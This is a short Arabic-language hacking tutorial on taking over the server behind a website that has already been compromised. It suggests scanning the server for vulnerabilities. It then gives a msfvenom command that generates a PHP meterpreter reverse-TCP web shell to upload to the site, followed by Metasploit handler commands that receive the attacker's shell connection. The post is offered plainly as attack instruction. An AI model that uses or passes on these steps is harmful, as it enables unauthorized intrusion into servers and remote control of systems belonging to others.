اختراق السيرفرات
بعد ان قمت ب اختراق الموقع المراد هنا تبدا تفكر في الهيمنة علي السيرفر المتصل به الموقع , اذا كيف يحدث ذالك ؟
ذالك يعتمد ايضا علي الفحص من خلال فحص ل اي بي السيرفر هناك احتمال وجود ثغرات ما عليك الا ان تحداد الثغر تبحث عن الاستغلال
احد طرق اختراق السيرفرات هي في حالة امكانية رفع ملف للموقع بذالك تقوم ب انشاء شيل وتقوم برعه علي الموقع
طريقة عمل الشيل
(msfvenom -p php/meterpreter_reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port to Connect On) -f raw > shell.php)
اسقبال الاتصال
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter_reverse_tcp
set LHOST (LHOST value)
set LPORT (LPORT value)
set ExitOnSession false
exploit -j -z
